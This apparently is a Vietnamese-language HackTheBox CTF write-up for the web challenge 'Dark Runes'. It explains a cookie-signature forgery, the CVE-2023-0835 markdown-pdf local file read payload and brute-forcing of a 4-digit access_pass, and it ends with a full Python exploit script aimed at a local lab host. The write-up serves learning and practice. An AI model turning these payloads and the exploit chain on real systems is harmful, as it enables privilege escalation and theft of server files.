---
layout: single
title: "Dark-Runes"
date: 2026-04-01 23:00:00 +0700
categories: [HackTheBox]
tags: [CTF, Web, Challenge ,Hackthebox]
password: "HTB{active1705}"
---
# Dark Runes - Easy - Web
## Tổng quan
Đây là 1 web challenge sử dụng NodeJS với các chức năng chính là tạo/xem/xóa document từ HTML.Ngoài ra còn chức năng export pdf và endpoint debug export dành cho admin.

```

|── /login
│   └── GET  [guest]  - Hiển thị form đăng nhập
├── /register
│   └── GET  [guest]  - Hiển thị form đăng ký
├── /login
│   └── POST [guest]  - Xác thực tài khoản, set cookie đăng nhập
├── /register
│   └── POST [guest]  - Tạo tài khoản mới
├── /documents
│   ├── GET  [auth]   - Liệt kê document của user hiện tại
│   └── POST [auth]   - Tạo document mới từ nội dung HTML
├── /documents/new
│   └── GET  [auth]   - Hiển thị form tạo document
├── /document/:id
│   └── GET  [auth]   - Xem nội dung document
├── /document/:id/delete
│   └── POST [auth]   - Xóa document
├── /document/export/:id
│   └── GET  [auth + admin] - Export document sang PDF
└── /document/debug/export
    └── POST [auth + admin] - Debug export PDF từ content nhập vào
```

Challenge này gồm chuỗi 2 bug logic (privilege escalation + brute force access_pass) kết hợp với CVE-2023-0835 (local file read via server-side XSS) để đọc flag.

## Privilege escalation
Trong quá trình đọc src code, phát hiện hàm `generateCookie()` dùng sign cookie và chức năng tạo mã hash của tài liệu sử dụng chung hàm `signString()` để hash.

```js
router.post("/documents", isAuthenticated, (req, res) => {
  ...

  const integrity = signString(content);    // Sử dụng signString() để hash content

  ...
});
```
và 
```js
const generateCookie = (username, id) => {
  const stringifiedUser = btoa(JSON.stringify({ username, id }));
  const sig = signString(stringifiedUser);  // Sử dụng signString() để hash stringifiedUser
  return `${stringifiedUser}-${sig}`;
};
```
Vì vậy có thể tạo được cookie của `admin` bằng cách post document mới với nội dung là base64 của `{"username":"admin","id":1}`,lấy signature trả về rồi ghép lại thành admin cookie.

## CVE-2023-0835
Kiểm tra `package.json` phát hiện ứng dụng dùng `markdown-pdf 11.0.0` có dính [CVE-2023-0835](https://fluidattacks.com/advisories/relsb).

Có thể sử dụng POC để đọc nội dung flag:
```js
<script>
 // Path Disclosure
 document.write(window.location);
 // Arbitrary Local File Read
 xhr = new XMLHttpRequest;
 xhr.onload=function(){document.write((this.responseText))};
 xhr.open("GET","file:///flag.txt");
 xhr.send();
</script>
```
## Brute force access_pass
Để trigger CVE-2023-0835, cần phải sử dụng hàm `generatePDF()` ở chức năng tạo pdf.

```js
const generatePDF = async (content) => {

  return new Promise((resolve, reject) => {
    markdownpdf({ remarkable: { html: true } })
      .from.string(content)
      .to.buffer(undefined, (err, buffer) => {
        if (err != null) return reject(err);
        return resolve(buffer);
      });
  });
};
```

Có 2 endpoit cho phép làm điều này: `[GET] /document/export/:id` và `[POST] /document/debug/export`.

Tuy nhiên ở `[GET] /document/export/:id` , content đã bị đưa qua hàm `nhm.translate()`, lúc này content sẽ được chuyển từ HTML sang Markdown nên bị mất các thẻ HTML gốc làm hỏng payload.

Giờ chỉ còn cách dùng `[POST] /document/debug/export`. Endpoint này yêu cầu `access_pass`,nếu sai thì `asscess_pass` sẽ bị rotate. Tuy nhiên ở đây không có biện pháp chống rate limit nào,và `access_pass` chỉ gồm 4 chữ số nên có thể brute force được.

## Exploit
```python
import requests
import base64

TARGET_HOST = '127.0.0.1'
TARGET_PORT = 1337
TARGET = f"http://{TARGET_HOST}:{TARGET_PORT}"

def register_user(username, password):
    response = requests.post(f'{TARGET}/register',data={'username':username,'password':password},verify=False)

def login(username,password):
    s = requests.Session()
    response = s.post(f'{TARGET}/login',data={'username':username,'password':password},verify=False)
    print(f"[+] Login response: {response.status_code} - {s.cookies['user']}")
    return s.cookies['user']

def crafHash(cookie):
    cookies = {
        'user': cookie
    }
    payload = "{\"username\":\"admin\",\"id\":1}"
    payloadBase64 = base64.b64encode(payload.encode()).decode()
    data = {
        'content': payloadBase64
    }
    response = requests.post(f'{TARGET}/documents',data=data,cookies=cookies,verify=False)
    signature = response.text.split(f'{payloadBase64}')[1].split('Signature: ')[1].split(' ')[0]
    print(f'[+] Craft admin signature: {signature}')
    return signature
    
def createPdf(adminCookie):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": TARGET,
        "Referer": f"{TARGET}/documents/new",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
    }
    # Payload:
    #     <script>
    #  // Path Disclosure
    #  document.write(window.location);
    #  // Arbitrary Local File Read
    #  xhr = new XMLHttpRequest;
    #  xhr.onload=function(){document.write((this.responseText))};
    #  xhr.open("GET","file:///flag.txt");
    #  xhr.send();
    # </script>
    cookies = {
        'user': adminCookie
    }
    for i in range(10000):
        access_pass = f"{i:04d}"
        data = f'content=%3cscript%3e%0d%0a%20%2f%2f%20Path%20Disclosure%0d%0a%20document.write(window.location)%3b%0d%0a%20%2f%2f%20Arbitrary%20Local%20File%20Read%0d%0a%20xhr%20%3d%20new%20XMLHttpRequest%3b%0d%0a%20xhr.onload%3dfunction()%7bdocument.write((this.responseText))%7d%3b%0d%0a%20xhr.open(%22GET%22%2c%22file%3a%2f%2f%2fflag.txt%22)%3b%0d%0a%20xhr.send()%3b%0d%0a%3c%2fscript%3e&access_pass={access_pass}'
        print(f"\r[+] Test access_pass : {access_pass}",end="")
        res = requests.post(f'{TARGET}/document/debug/export',cookies=cookies,data=data,headers=headers,verify=False)
        if (res.status_code == 200):
            print("\n[+] Get Flag Success. Pls open flag.pdf to get flag.")
            with open("flag.pdf","wb") as f:
                f.write(res.content)
                return
    print("\n[-] Cant brute force access_pass. Pls try again.")
        
    


if __name__ == "__main__":
    register_user('test1', '1')
    userCookie = login('test1', '1')
    adminSignature = crafHash(userCookie)
    data = "{\"username\":\"admin\",\"id\":1}"
    dataBase64 = base64.b64encode(data.encode()).decode()
    adminCookie = f'{dataBase64}-{adminSignature}'
    createPdf(adminCookie.strip())
```